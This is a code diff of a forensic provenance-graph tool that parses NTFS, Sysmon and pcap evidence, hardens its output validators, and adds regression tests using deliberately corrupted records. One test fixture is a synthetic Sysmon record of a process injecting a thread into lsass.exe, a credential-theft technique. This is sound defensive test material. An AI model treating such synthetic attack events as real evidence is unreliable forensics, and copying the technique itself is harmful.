         binds = sorted((e for e in es if e["rel"] in BINDING_RELATIONS), key=order)
         t0 = next((e["ts"] for e in actions if e["ts"]), 0)
@@ -2727,9 +3400,19 @@ class TemporalProvenanceGraph:
             warnings.append(f"{len(self.leads_rejected)} Sector B lead(s) refused for provenance; see attack_graph.json")
         if not self.verify_anchors:
             warnings.append("Anchor verification was DISABLED for this run; not fit for a Section 63 certificate")
-        unver = sum(1 for p in _all_anchors(steps + bindings) if p["anchor_reverified"] is not True)
+        unver = sum(1 for p in _all_anchors(steps + bindings) if p.get("anchor_reverified") is not True)
         if unver:
             warnings.append(f"{unver} storyline anchor(s) could not be re-hashed from the evidence on this workstation")
+        integ = self.ingest_integrity()
+        if integ["status"] != "OK":
+            warnings.append(f"INTEGRITY_FAILURE: {integ['anchor_hash_mismatches']} anchor(s) offered at ingest no longer "
+                            f"match the evidence bytes; not fit for a Section 63 certificate")
+        if self.timestomp_report.get("unreadable_count"):
+            warnings.append(f"{self.timestomp_report['unreadable_count']} $MFT/$J record(s) could not be read; "
+                            f"see attack_graph.json timestomp_analysis.unreadable_records")
+        if self.time_anomalies:
+            warnings.append(f"{len(self.time_anomalies)} record time(s) outside 1970-2554 were kept as TIME_UNKNOWN; "
+                            f"see attack_graph.json time_anomalies")
         doc: Dict[str, Any] = {
             "schema": "SUTRA-STORYLINE/1", "version": GRAPH_VERSION, "revision": GRAPH_REVISION, "case_id": self.case_id,
             "generated_utc": generated_utc or ns_to_iso(time.time_ns()),
@@ -2739,7 +3422,9 @@ class TemporalProvenanceGraph:
             "solver": {"algorithm": "Deterministic prize-collecting Steiner tree (greedy shortest-path growth + strong "
                                     "pruning); integer Q16.16 costs", "max_nodes": max_nodes, "lambda": lam,
                        "objective": "minimise sum(L_max - L_rec(e) * gate(e)) + lambda * sum(p(v) for v not in tree)",
-                       "tie_break": "physical byte offset Omega(e), then source file, length, relation, node keys",
+                       "tie_break": "solver: physical byte offset Omega(e), then source file, length, relation, node "
+                                    "keys; step order: time, byte offset, creation before the created entity's "
+                                    "actions, edge uid",
                        "tree_value_q16": res["value"], "tree_nodes": len(res["nodes"])},
             "nodes": sorted(self.entities.label(v) for v in res["nodes"]),
             "stages": stages, "steps": steps, "identity_bindings": bindings,
@@ -2756,23 +3441,29 @@ class TemporalProvenanceGraph:
                                   "steps_with_complete_anchor": sum(1 for s in steps if all(
                                       s["provenance"].get(k) not in (None, "") for k in SECTION63_FIELDS)),
                                   "anchors_reverified": sum(1 for p in _all_anchors(steps + bindings)
-                                                            if p["anchor_reverified"] is True),
+                                                            if p.get("anchor_reverified") is True),
                                   "anchors_total": len(_all_anchors(steps + bindings))},
             "anchor_verification": "REHASHED_FROM_EVIDENCE" if self.verify_anchors else "DISABLED",
             "audit_ledger": self.audit.entries, "audit_genesis": self.audit.genesis,
             "audit_ledger_head_sha256": self.audit.head, "audit_ledger_count": len(self.audit.entries),
             "audit_ledger_hmac": self.audit.key is not None,
+            "integrity_status": integ,
             "warnings": warnings,
         }
-        doc["storyline_sha256"] = _sha256_hex(canonical_json({k: v for k, v in doc.items() if k != "generated_utc"}))
+        doc["storyline_sha256"] = canonical_sha256({k: v for k, v in doc.items() if k != "generated_utc"})
         if write:
             self._write(STORYLINE_FILENAME, doc)
         return doc
 
     # ----- attack graph export ---------------------------------------------- #
 
-    def export_attack_graph(self, generated_utc: Optional[str] = None, max_edges: int = 250_000,
+    def export_attack_graph(self, generated_utc: Optional[str] = None, max_edges: int = DEFAULT_EXPORT_MAX_EDGES,
                             write: bool = True) -> Dict[str, Any]:
+        """
+        attack_graph.json: every live edge with its anchor, or the max_edges most suspicious ones (the rest
+        counted in statistics.edges_truncated). The default is sized for the pipeline's memory budget; the
+        digest is computed over the canonical form in a stream, never as one copy of the whole document.
+        """
         truncated = 0
         if self.arena.count > max_edges:
             live = heapq.nsmallest(max_edges, self.arena.iter_edges(),
@@ -2828,8 +3519,9 @@ class TemporalProvenanceGraph:
             "leads_rejected": self.leads_rejected,
             "lead_index": {lid: [self.edge_uid(self.edge(q)) for q in qs if self.arena.is_live(q)]
                            for lid, qs in sorted(self.lead_edges.items())},
+            "integrity_status": self.ingest_integrity(), "time_anomalies": self.time_anomalies,
         }
-        doc["graph_sha256"] = _sha256_hex(canonical_json({k: v for k, v in doc.items() if k != "generated_utc"}))
+        doc["graph_sha256"] = canonical_sha256({k: v for k, v in doc.items() if k != "generated_utc"})
         if write:
             self._write(ATTACK_GRAPH_FILENAME, doc)
         return doc
@@ -2856,27 +3548,70 @@ def _anchor_ok(p: Any) -> bool:
             and bool(re.fullmatch(r"[0-9a-f]{64}", str(p.get("sha256")))))
 
 
-def _all_anchors(rows: Sequence[Dict[str, Any]]) -> List[Dict[str, Any]]:
-    """Every Section 63 anchor of a storyline row list: the primary and each secondary anchor."""
-    out = []
+def _all_anchors(rows: Sequence[Any]) -> List[Dict[str, Any]]:
+    """
+    Every Section 63 anchor of a storyline row list: the primary and each secondary anchor. A row or an
+    anchor that is not a JSON object (a hand-edited or damaged file) counts as one empty, unverified anchor.
+    """
+    out: List[Dict[str, Any]] = []
     for r in rows:
-        out.append(r["provenance"])
-        out.extend(v for _k, v in sorted((r.get("secondary_anchors") or {}).items()))
+        if not isinstance(r, dict):
+            out.append({})
+            continue
+        p = r.get("provenance")
+        out.append(p if isinstance(p, dict) else {})
+        sec = r.get("secondary_anchors")
+        if isinstance(sec, dict):
+            out.extend(v if isinstance(v, dict) else {} for _k, v in sorted(sec.items()))
+        elif sec:
+            out.append({})
     return out
 
 
 def _audit_errors(doc: Dict[str, Any], key: Optional[bytes]) -> List[str]:
     if "audit_ledger" not in doc or "audit_ledger_head_sha256" not in doc or "audit_ledger_count" not in doc:
         return ["missing audit ledger head/count"]
-    ok = AuditLedger.verify(doc["audit_ledger"], doc.get("audit_genesis", "0" * 64), doc["audit_ledger_head_sha256"],
-                            doc["audit_ledger_count"], key)
+    led = doc["audit_ledger"]
+    ok = isinstance(led, list) and all(isinstance(e, dict) for e in led)
+    if ok:
+        try:
+            ok = AuditLedger.verify(led, doc.get("audit_genesis", "0" * 64), doc["audit_ledger_head_sha256"],
+                                    doc["audit_ledger_count"], key)
+        except (ValueError, TypeError, KeyError, AttributeError, RecursionError):   # NaN or non-JSON values
+            ok = False
     errs = [] if ok else ["audit ledger chain does not verify (altered, re-rooted or truncated)"]
-    if doc.get("sector_a_binding") and doc.get("audit_genesis") != doc["sector_a_binding"].get("master_case_root_v3"):
+    sab = doc.get("sector_a_binding")
+    if sab and (not isinstance(sab, dict) or doc.get("audit_genesis") != sab.get("master_case_root_v3")):
         errs.append("audit ledger is not rooted in the Sector A master case root")
     return errs
 
 
+def _digest_error(doc: Dict[str, Any], field: str) -> Optional[str]:
+    """The document's own digest, recomputed over the canonical form (streamed: no full copy in memory)."""
+    body = {k: v for k, v in doc.items() if k not in (field, "generated_utc")}
+    try:
+        ok = canonical_sha256(body) == doc[field]
+    except (ValueError, TypeError, RecursionError):
+        return f"{field}: document holds values that are not canonical JSON (NaN, Infinity or non-JSON types)"
+    return None if ok else f"{field} does not match content"
+
+
+def _guarded(check: Callable[..., List[str]], doc: Any, *args: Any) -> List[str]:
+    """A validator is a gate: a document it cannot read fails the gate with a message, it never raises."""
+    if not isinstance(doc, dict):
+        return ["document is not a JSON object"]
+    try:
+        return check(doc, *args)
+    except Exception as exc:    # a malformed value the checks did not anticipate
+        return [f"validator error: {type(exc).__name__}: {exc}"[:300]]
+
+
 def validate_attack_graph(doc: Dict[str, Any], audit_key: Optional[bytes] = None) -> List[str]:
+    """Structure, anchors, audit chain and digest of attack_graph.json. Returns errors; never raises."""
+    return _guarded(_validate_attack_graph, doc, audit_key)
+
+
+def _validate_attack_graph(doc: Dict[str, Any], audit_key: Optional[bytes]) -> List[str]:
     errs = []
     for k in ("schema", "version", "case_id", "statistics", "nodes", "edges", "graph_sha256"):
         if k not in doc:
@@ -2885,22 +3620,35 @@ def validate_attack_graph(doc: Dict[str, Any], audit_key: Optional[bytes] = None
         return errs
     if doc["schema"] != "SUTRA-T-PKG/1":
         errs.append("schema mismatch")
-    ids = set()
-    for n in doc["nodes"]:
-        if n.get("kind") not in ENTITY_KINDS or not n.get("id") or n["id"] in ids:
-            errs.append(f"bad node {n.get('id')}")
-        ids.add(n.get("id"))
-    for e in doc["edges"]:
-        if e.get("source") not in ids or e.get("target") not in ids:
+    nodes, edges = doc["nodes"], doc["edges"]
+    for name, v in (("nodes", nodes), ("edges", edges)):
+        if not isinstance(v, list):
+            errs.append(f"{name} is not a list")
+    ids: Set[str] = set()
+    for n in nodes if isinstance(nodes, list) else []:
+        if not isinstance(n, dict):
+            errs.append("node is not a JSON object")
+            continue
+        nid = n.get("id")
+        if n.get("kind") not in ENTITY_KINDS or not isinstance(nid, str) or not nid or nid in ids:
+            errs.append(f"bad node {nid}")
+        if isinstance(nid, str):
+            ids.add(nid)
+    for e in edges if isinstance(edges, list) else []:
+        if not isinstance(e, dict):
+            errs.append("edge is not a JSON object")
+            continue
+        src, dst, rel = e.get("source"), e.get("target"), e.get("relation")
+        if not isinstance(src, str) or src not in ids or not isinstance(dst, str) or dst not in ids:
             errs.append(f"edge {e.get('id')} references an unknown node")
-        if e.get("relation") not in RELATION_BY_NAME:
+        if not isinstance(rel, str) or rel not in RELATION_BY_NAME:
             errs.append(f"edge {e.get('id')} has unknown relation")
         if not _anchor_ok(e.get("provenance")):
             errs.append(f"edge {e.get('id')} lacks a complete physical anchor")
     errs.extend(_audit_errors(doc, audit_key))
-    body = {k: v for k, v in doc.items() if k not in ("graph_sha256", "generated_utc")}
-    if _sha256_hex(canonical_json(body)) != doc["graph_sha256"]:
-        errs.append("graph_sha256 does not match content")
+    bad = _digest_error(doc, "graph_sha256")
+    if bad:
+        errs.append(bad)
     return errs
 
 
@@ -2908,8 +3656,15 @@ def validate_storyline(doc: Dict[str, Any], max_nodes: int = 25, require_reverif
                        audit_key: Optional[bytes] = None) -> List[str]:
     """
     Checks a Sector D certificate relies on. With require_reverified (default), every anchor in the
-    storyline (step, binding and secondary) must say anchor_reverified: true.
+    storyline (step, binding and secondary) must say anchor_reverified: true. A storyline whose ingest
+    found evidence bytes altered after they were recorded (integrity_status INTEGRITY_FAILURE) fails.
+    Returns the errors; a malformed document fails with a message and never raises.
     """
+    return _guarded(_validate_storyline, doc, max_nodes, require_reverified, audit_key)
+
+
+def _validate_storyline(doc: Dict[str, Any], max_nodes: int, require_reverified: bool,
+                        audit_key: Optional[bytes]) -> List[str]:
     errs = []
     for k in ("schema", "case_id", "steps", "identity_bindings", "nodes", "causality", "defense_challenge_matrix",
               "storyline_sha256"):
@@ -2917,9 +3672,18 @@ def validate_storyline(doc: Dict[str, Any], max_nodes: int = 25, require_reverif
             errs.append(f"missing {k}")
     if errs:
         return errs
-    if len(doc["nodes"]) > max_nodes:
-        errs.append(f"{len(doc['nodes'])} nodes exceeds {max_nodes}")
-    for i, s in enumerate(doc["steps"], 1):
+    lists = {k: doc[k] for k in ("steps", "identity_bindings", "nodes")}
+    for k, v in lists.items():
+        if not isinstance(v, list):
+            errs.append(f"{k} is not a list")
+            lists[k] = []
+    steps, binds = lists["steps"], lists["identity_bindings"]
+    if len(lists["nodes"]) > max_nodes:
+        errs.append(f"{len(lists['nodes'])} nodes exceeds {max_nodes}")
+    for i, s in enumerate(steps, 1):
+        if not isinstance(s, dict):
+            errs.append(f"step {i}: not a JSON object")
+            continue
         for k in STORYLINE_STEP_FIELDS:
             if k not in s:
                 errs.append(f"step {i}: missing {k}")
@@ -2928,21 +3692,26 @@ def validate_storyline(doc: Dict[str, Any], max_nodes: int = 25, require_reverif
         p = s.get("provenance", {})
         if not _anchor_ok(p) or any(k not in p for k in SECTION63_FIELDS):
             errs.append(f"step {i}: incomplete Section 63 anchor")
-    for b in doc["identity_bindings"]:
-        if not _anchor_ok(b.get("provenance")):
+    for b in binds:
+        if not isinstance(b, dict) or not _anchor_ok(b.get("provenance")):
             errs.append("identity binding without anchor")
     if require_reverified:
         if doc.get("anchor_verification") != "REHASHED_FROM_EVIDENCE":
             errs.append("anchors were not re-hashed from the evidence (verification disabled)")
-        bad = sum(1 for p in _all_anchors(doc["steps"] + doc["identity_bindings"]) if p.get("anchor_reverified") is not True)
+        bad = sum(1 for p in _all_anchors(steps + binds) if p.get("anchor_reverified") is not True)
         if bad:
             errs.append(f"{bad} anchor(s) not re-verified against the evidence")
+    integ = doc.get("integrity_status")
+    if integ is not None and (not isinstance(integ, dict) or integ.get("status") != "OK"):
+        n = integ.get("anchor_hash_mismatches") if isinstance(integ, dict) else "?"
+        errs.append(f"INTEGRITY_FAILURE at ingest: {n} anchor(s) no longer matched the evidence bytes "
+                    f"(evidence or manifest altered after the anchors were recorded)")
     errs.extend(_audit_errors(doc, audit_key))
-    if TemporalProvenanceGraph.storyline_paradoxes(doc["steps"]):
+    if TemporalProvenanceGraph.storyline_paradoxes(steps):
         errs.append("storyline contains causality inversions")
-    body = {k: v for k, v in doc.items() if k not in ("storyline_sha256", "generated_utc")}
-    if _sha256_hex(canonical_json(body)) != doc["storyline_sha256"]:
-        errs.append("storyline_sha256 does not match content")
+    bad_digest = _digest_error(doc, "storyline_sha256")
+    if bad_digest:
+        errs.append(bad_digest)
     return errs
 
 
@@ -2957,6 +3726,8 @@ def build_from_sector_outputs(evidence_manifest: Optional[str], triage_manifest:
     """
     with open(triage_manifest, "r", encoding="utf-8") as f:
         tm = json.load(f)
+    if not isinstance(tm, dict):
+        raise ValueError("MANIFEST_MALFORMED: triage manifest is not a JSON object")
     os.makedirs(output_dir, exist_ok=True)
     g = TemporalProvenanceGraph(case_id=case_id or tm.get("case_id") or "UNKNOWN", output_dir=output_dir,
                                 evidence_root=evidence_root or os.path.dirname(os.path.abspath(triage_manifest)),
@@ -3582,6 +4353,713 @@ def _audit_regressions(workdir: str, case: str, gen: str, ctx: Dict[str, Any]) -
     return out
 
 
+def _overnight_regressions(workdir: str, case: str, gen: str, ctx: Dict[str, Any]) -> List[Tuple[str, str, bool, str]]:
+    """
+    Regression checks for the overnight audit of this module (findings C-01..C-22, C-D1-01, C-ORD01,
+    C-LNK01). Each check runs in its own guard: an exception fails that check, never the self-test.
+    """
+    import copy
+    import gc
+    import inspect
+    import io
+    import shutil
+    import tracemalloc
+    import types
+    out: List[Tuple[str, str, bool, str]] = []
+    odir = os.path.join(workdir, "overnight_regressions")
+    os.makedirs(odir, exist_ok=True)
+    T = _t("2026-10-14T06:00:00Z")
+    ft = lambda s: ns_to_filetime(iso_to_ns(s))
+    good_ft = ft("2026-10-14T06:10:11.4821337Z")
+    cdir, exp = ctx.get("cdir"), ctx.get("exp") or {}
+    e2e_dir, a_path, b_path = ctx.get("e2e_dir"), ctx.get("a_path"), ctx.get("b_path")
+    e2e_graph, e2e_story = ctx.get("e2e_graph"), ctx.get("e2e_story")
+
+    def run(rid: str, name: str, fn: Callable[[], Tuple[Any, str]]) -> None:
+        try:
+            ok, detail = fn()
+        except Exception as exc:     # a crash is exactly what most of these findings were about
+            ok, detail = False, f"raised {type(exc).__name__}: {exc}"[:300]
+        out.append((rid, name, bool(ok), detail))
+
+    def sub(name: str) -> str:
+        p = os.path.join(odir, name)
+        if os.path.isdir(p):
+            shutil.rmtree(p)
+        os.makedirs(p)
+        return p
+
+    def graph(root: Optional[str] = None, **kw: Any) -> TemporalProvenanceGraph:
+        return TemporalProvenanceGraph(case, capacity=kw.pop("capacity", 256), output_dir=root or odir,
+                                       evidence_root=root, **kw)
+
+    def write_bytes(path: str, data: bytes) -> str:
+        with open(path, "wb") as f:
+            f.write(data)
+        return path
+
+    def write_text(path: str, lines: Sequence[str], encoding: str = "utf-8") -> str:
+        with open(path, "w", encoding=encoding, newline="\n") as f:
+            f.write("\n".join(lines) + "\n")
+        return path
+
+    def caught(fn: Callable[[], Any]) -> str:
+        try:
+            fn()
+            return "ok"
+        except Exception as exc:
+            return f"{type(exc).__name__}: {exc}"[:120]
+
+    def sysmon(eid: int, utc: str = "2026-10-14 06:10:20.000", **kv: Any) -> str:
+        base = {"EventID": eid, "UtcTime": utc, "Image": "C:\\x\\a.exe", "ProcessId": 1}
+        base.update(kv)
+        return json.dumps(base)
+
+    inject = sysmon(8, SourceImage="C:\\x\\a.exe", SourceProcessId=1, TargetImage="C:\\Windows\\System32\\lsass.exe",
+                    TargetProcessId=2)
+    base_rec = build_mft_record(40, "a.exe", 5, [good_ft] * 4, [good_ft] * 4, 0x9000, 0x100)
+
+    # C-01  one flipped bit in an $MFT record header / an attribute at the record end -> error record, no raise
+    def c01():
+        cases = {}
+        b = bytearray(base_rec)
+        b[5] ^= 0x80                                    # usa_off high bit
+        cases["usa_off bit"] = bytes(b)
+        b = bytearray(base_rec)
+        b[7] ^= 0x40                                    # usa_cnt high byte
+        cases["usa_cnt bit"] = bytes(b)
+        fa = struct.unpack_from("<H", base_rec, 0x14)[0]
+        b = bytearray(base_rec)
+        struct.pack_into("<H", b, 6, 0)
+        struct.pack_into("<II", b, fa, 0x80, 1016 - fa)
+        struct.pack_into("<II", b, 1016, 0x80, 8)       # attribute header ending exactly at the record end
+        cases["attr at end"] = bytes(b)
+        b = bytearray(base_rec)
+        struct.pack_into("<H", b, 6, 0)
+        struct.pack_into("<II", b, fa, 0x80, 1010 - fa)
+        struct.pack_into("<II", b, 1010, 0x80, 14)      # resident header straddling the end
+        cases["attr straddles end"] = bytes(b)
+        res = {k: parse_mft_record(v, 4096) for k, v in cases.items()}
+        ok = all(isinstance(r, dict) and str(r.get("error", "")).startswith("MALFORMED_RECORD")
+                 and r.get("length") == 1024 and r.get("byte_offset") == 4096 for r in res.values())
+        return ok, "; ".join(f"{k}: {str((r or {}).get('error'))[:40]}" for k, r in res.items())
+    run("C-01", "A bit flip in an $MFT record header gives a MALFORMED_RECORD entry, not struct.error/IndexError", c01)
+
+    # C-02  torn record (FIXUP_MISMATCH) with a Sector A manifest bound: no KeyError 'length'
+    def c02():
+        d = sub("c02")
+        b = bytearray(base_rec)
+        b[1022] ^= 0xFF
+        img = bytearray(1 << 16)
+        img[0:1024] = b
+        p = write_bytes(os.path.join(d, "torn.img"), bytes(img))
+        g = graph(d, verify_anchors=False)
+        g.vault_files.add("torn.img")
+        g.bad_sectors = [99]                            # the state after ingest_evidence_manifest
+        r = g.ingest_ntfs(p, 0, 4096)
+        u = g.timestomp_report.get("unreadable_records") or []
+        return (r.get("unreadable") == 1 and len(u) == 1 and u[0]["error"].startswith("FIXUP_MISMATCH")
+                and u[0]["length"] == 1024), f"ingest -> {r}; unreadable {[x['error'][:30] for x in u]}"
+    run("C-02", "A torn $MFT record with Sector A bound is reported, not a KeyError", c02)
+
+    # C-03  'BAAD' / damaged signature / torn record of the timestomped file: reported, audit-logged, D2 OPEN
+    def c03():
+        n = exp["ntfs"]
+        at = exp["mft_a_exe"][1]
+        with open(os.path.join(cdir, "victim_disk.img"), "rb") as f:
+            img = f.read()
+        res = []
+        for label, patch in (("magic bit", lambda b: b.__setitem__(at, b[at] ^ 0x01)),
+                             ("BAAD", lambda b: b.__setitem__(slice(at, at + 4), b"BAAD")),
+                             ("torn", lambda b: b.__setitem__(at + 510, b[at + 510] ^ 0xFF))):
+            d = sub("c03_" + label.replace(" ", "_"))
+            b = bytearray(img)
+            patch(b)
+            p = write_bytes(os.path.join(d, "victim_disk.img"), bytes(b))
+            g = graph(d, verify_anchors=False)
+            g.ingest_ntfs(p, n["mft_offset"], n["mft_length"], n["usn_offset"], n["usn_length"])
+            f_un = [x for x in g.timestomp_report["findings"] if x.get("rule") == "UNREADABLE_RECORD"]
+            aud = [e for e in g.audit.entries if e.get("action") == "RECORD_UNREADABLE"]
+            d2 = next(r for r in g.export_storyline(gen, write=False)["defense_challenge_matrix"]["rows"]
+                      if r["id"] == "D2")
+            res.append((label, len(f_un) == 1 and f_un[0].get("byte_offset") == at and len(aud) == 1
+                        and d2["status"] == "OPEN", f"{label}: findings {len(f_un)}, audit {len(aud)}, D2 {d2['status']}"))
+        # a short read (image ends inside the $MFT extent) is reported too
+        d = sub("c03_short")
+        p = write_bytes(os.path.join(d, "short.img"), img[:n["mft_offset"] + 41 * 1024 + 300])
+        g = graph(d, verify_anchors=False)
+        g.ingest_ntfs(p, n["mft_offset"], n["mft_length"])
+        sr = [x for x in g.timestomp_report["unreadable_records"] if "SHORT_READ" in x["error"]]
+        res.append(("short", len(sr) == 1 and sr[0]["byte_offset"] == n["mft_offset"] + 41 * 1024,
+                    f"short read reported at {sr[0]['byte_offset'] if sr else None}"))
+        return all(ok for _l, ok, _d in res), "; ".join(dd for _l, _o, dd in res)
+    run("C-03", "Damaged/BAAD/torn $MFT records and short reads are findings + audit entries; D2 stays OPEN", c03)
+
+    # C-04  ns_to_iso is total: year > 9999 and (emulated Windows gmtime_s) any pre-1970 time
+    def c04():
+        huge = ns_to_iso(filetime_to_ns(0x7FFFFFFFFFFFFFFF))
+        js = build_usn_stream([(40, 5, 0x7FFFFFFFFFFFFFFF, USN_REASON_FILE_CREATE, "a.exe"),
+                               (41, 5, good_ft, USN_REASON_FILE_CREATE, "b.exe")])
+        j1 = caught(lambda: parse_usn_journal(js))
+        real_dt = datetime.datetime
+
+        class WinDT(real_dt):          # Windows: gmtime_s refuses negative time_t and times after year 3000
+            @classmethod
+            def fromtimestamp(cls, t, tz=None):
+                if t < 0 or t > 32536799999:
+                    raise OSError(22, "Invalid argument")
+                return real_dt.fromtimestamp(t, tz)
+
+        g_ = globals()
+        real_mod = g_["datetime"]
+        g_["datetime"] = types.SimpleNamespace(datetime=WinDT, timezone=datetime.timezone, timedelta=datetime.timedelta)
+        try:
+            pre = caught(lambda: ns_to_iso(-5 * NS + 7))
+            pre_v = ns_to_iso(-5 * NS + 7) if pre == "ok" else None
+            js2 = build_usn_stream([(40, 5, good_ft, USN_REASON_FILE_CREATE, "a.exe"),
+                                    (41, 5, 5, USN_REASON_FILE_CREATE, "b.exe")])
+            j2 = caught(lambda: parse_usn_journal(js2))
+        finally:
+            g_["datetime"] = real_mod
+        ok = (str(huge).startswith("OUT_OF_RANGE:") and j1 == "ok" and pre_v == "1969-12-31T23:59:55.000000007Z"
+              and j2 == "ok")
+        return ok, f"year 30828 -> {str(huge)[:30]}; $J huge ts: {j1}; Windows pre-1970: {pre_v or pre}; $J rollback: {j2}"
+    run("C-04", "ns_to_iso never raises: year 30828 -> OUT_OF_RANGE, pre-1970 works without gmtime (Windows)", c04)
+
+    # C-05  backdated / far-future record times keep the record as TIME_UNKNOWN instead of aborting the ingest
+    def c05():
+        d = sub("c05")
+        p = write_text(os.path.join(d, "s.jsonl"), [
+            sysmon(1, "1601-01-01 00:00:00.000", Image="C:\\x\\c.exe", ProcessId=5, ParentImage="C:\\x\\p.exe",
+                   ParentProcessId=4, CommandLine="c.exe"),
+            sysmon(1, "2600-01-01 00:00:00.000", Image="C:\\x\\e.exe", ProcessId=6, ParentImage="C:\\x\\p.exe",
+                   ParentProcessId=4, CommandLine="e.exe")])
+        g = graph(d)
+        n1 = g.ingest_sysmon_jsonl(p)
+        unknown = sum(1 for _q, r in g.arena.iter_edges() if r[4] == 0 and r[3] & FLAG_TIME_UNKNOWN)
+        old = ft("1965-03-01T00:00:00.1234567Z")
+        img = bytearray(1 << 16)
+        img[31 * 1024:32 * 1024] = build_mft_record(31, "Public", 5, [good_ft] * 4, [good_ft] * 4, 0x100, 0x10,
+                                                    is_dir=True)
+        img[40 * 1024:41 * 1024] = build_mft_record(40, "a.exe", 31, [old] * 4, [old] * 4, 0x9000, 0x100)
+        ip = write_bytes(os.path.join(d, "fnold.img"), bytes(img))
+        sy = write_text(os.path.join(d, "w.jsonl"), [sysmon(11, "2026-10-14 06:10:11.000", Image="C:\\x\\p.exe",
+                                                            ProcessId=4, TargetFilename="C:\\Public\\a.exe")])
+        g2 = graph(d)
+        g2.ingest_sysmon_jsonl(sy)
+        r2 = g2.ingest_ntfs(ip, 0, 64 * 1024)
+        wrote = [g2.edge(q) for q, r in g2.arena.iter_edges() if r[2] == REL_WROTE_FILE]
+        ok = (n1 == 2 and unknown == 2 and len(g.time_anomalies) == 2 and r2["edges_added"] == 1
+              and wrote and wrote[0]["ts"] == 0 and wrote[0]["meta"].get("timestamp_out_of_range") is True
+              and len(g2.time_anomalies) == 1)
+        return ok, (f"Sysmon 1601/2600: {n1} edges kept, {unknown} TIME_UNKNOWN, {len(g.time_anomalies)} anomalies; "
+                    f"$FN.B 1965: {r2['edges_added']} WROTE_FILE edge, ts {wrote[0]['ts'] if wrote else None}")
+    run("C-05", "Pre-1970 / post-2554 Sysmon and $FN times are kept as TIME_UNKNOWN, not ValueError", c05)
+
+    # C-06  a malformed Sector B lead that passes B's validator is refused whole, the stage goes on
+    def c06():
+        if not (a_path and b_path and _sector_b is not None):
+            return False, "Sector A/B modules not found"
+        with open(b_path, "r", encoding="utf-8") as f:
+            base_m = json.load(f)
+
+        def reseal(m):
+            m["manifest_sha256"] = hashlib.sha256(
+                _sector_b.canonical_json({k: v for k, v in m.items() if k != "manifest_sha256"})).hexdigest()
+            return m
+
+        def lead(m, cat):
+            return next(l for l in m["symbolic_anchors"] if l["threat_category"] == cat)
+
+        def smurf(m):
+            outs = lead(m, "RAPID_UPI_SMURFING")["lead_details"].get("outflows") or []
+            outs[-1].pop("payee_vpa", None)
+
+        muts = {"empty payee_vpa": ("INVALID_NPCI_RRN",
+                                    lambda m: lead(m, "INVALID_NPCI_RRN")["lead_details"]["transaction"].update(payee_vpa="")),
+                "file_path int": ("REMOTE_ACCESS_SESSION",
+                                  lambda m: lead(m, "REMOTE_ACCESS_SESSION")["symbolic_anchor"].update(file_path=7)),
+                "byte_offset 2**63": ("REMOTE_ACCESS_SESSION",
+                                      lambda m: lead(m, "REMOTE_ACCESS_SESSION")["symbolic_anchor"].update(byte_offset=2 ** 63)),
+                "smurf leg without payee": ("RAPID_UPI_SMURFING", smurf),
+                "WebRTC time 1969": ("WEBRTC_PEER_ENDPOINT",
+                                     lambda m: lead(m, "WEBRTC_PEER_ENDPOINT")["lead_details"]["candidate"].update(
+                                         timestamp_utc="1969-12-31T23:59:59.000Z"))}
+        res = []
+        for label, (cat, mut) in muts.items():
+            m = copy.deepcopy(base_m)
+            mut(m)
+            lid = lead(m, cat)["lead_id"]
+            reseal(m)
+            g = graph(e2e_dir, capacity=4096)
+            try:
+                g.ingest_evidence_manifest(a_path)
+                g.ingest_triage_manifest(m)
+            except Exception as exc:
+                res.append((False, f"{label}: {type(exc).__name__}: {exc}"[:90]))
+                continue
+            finally:
+                g.close()
+            rej = [r for r in g.leads_rejected if r["lead_id"] == lid]
+            partial = sum(1 for v in g.edge_meta.values() if isinstance(v, dict) and v.get("lead_id") == lid)
+            if label.startswith("WebRTC"):
+                ok = not rej and lid in g.lead_edges and len(g.time_anomalies) >= 1
+            else:
+                ok = len(rej) == 1 and lid not in g.lead_edges and partial == 0
+            res.append((ok, f"{label}: {rej[0]['reason'][:40] if rej else 'converted'}"))
+        return all(o for o, _d in res), "; ".join(dd for _o, dd in res)
+    run("C-06", "Malformed Sector B leads go to leads_rejected whole (no partial edges); the stage does not abort", c06)
+
+    # C-07  a Sysmon line that is not a JSON object, or a port that is not a number, is UNPARSEABLE_RECORD
+    def c07():
+        d = sub("c07")
+        res = []
+        for label, first in (("array", "[1, 2]"), ("string", '"hello"'),
+                             ("port", sysmon(3, SourceIp="10.0.0.1", SourcePort="http", DestinationIp="1.2.3.4",
+                                             DestinationPort=80))):
+            p = write_text(os.path.join(d, f"{label}.jsonl"), [first, inject])
+            g = graph(d)
+            n = g.ingest_sysmon_jsonl(p)
+            bad = sum(v for k, v in g.rejected_count.items() if k.startswith("UNPARSEABLE_RECORD"))
+            res.append((n == 1 and bad == 1, f"{label}: {n} edge, {bad} unparseable"))
+        return all(o for o, _d in res), "; ".join(dd for _o, dd in res)
+    run("C-07", "Sysmon: non-object JSON lines and non-numeric ports are rejected, the log ingest goes on", c07)
+
+    # C-08  pcap record header with a corrupt incl_len: reported, no silent stop, no 4 GiB read
+    def c08():
+        d = sub("c08")
+        with open(os.path.join(cdir, "network_capture.pcap"), "rb") as f:
+            raw = bytearray(f.read())
+        clean = sum(1 for _ in iter_pcap_tcp_syns(os.path.join(cdir, "network_capture.pcap")))
+        b = bytearray(raw)
+        b[24 + 8 + 2] ^= 0x01                           # incl_len of record 1: 70 -> 65606
+        p1 = write_bytes(os.path.join(d, "flip.pcap"), bytes(b))
+        b = bytearray(raw)
+        struct.pack_into("<I", b, 24 + 8, 0xFFFFFFF0)
+        p2 = write_bytes(os.path.join(d, "huge.pcap"), bytes(b[:24 + 16 + 70]))
+        p3 = write_bytes(os.path.join(d, "cut.pcap"), bytes(raw[:24 + 16 + 30]))
+        res = []
+        for label, p, why in (("bit flip", p1, "PCAP_RECORD_CORRUPT"), ("4 GiB incl_len", p2, "PCAP_RECORD_CORRUPT"),
+                              ("cut mid-record", p3, "TRUNCATED_CAPTURE")):
+            g = graph(d)
+            gc.collect()
+            tracemalloc.start()
+            n = g.ingest_pcap(p)
+            _c, peak = tracemalloc.get_traced_memory()
+            tracemalloc.stop()
+            aud = [e for e in g.audit.entries if e.get("action") == "CAPTURE_UNREADABLE"]
+            res.append((g.rejected_count.get(why) == 1 and len(aud) == 1 and peak < 16 << 20,
+                        f"{label}: {n} edges, rejected {dict(g.rejected_count)}, peak {peak / 2**20:.1f} MiB"))
+        return clean > 0 and all(o for o, _d in res), f"clean SYNs {clean}; " + "; ".join(dd for _o, dd in res)
+    run("C-08", "pcap: a corrupt incl_len or a cut capture is a recorded rejection, never a silent end or a 4 GiB read",
+        c08)
+
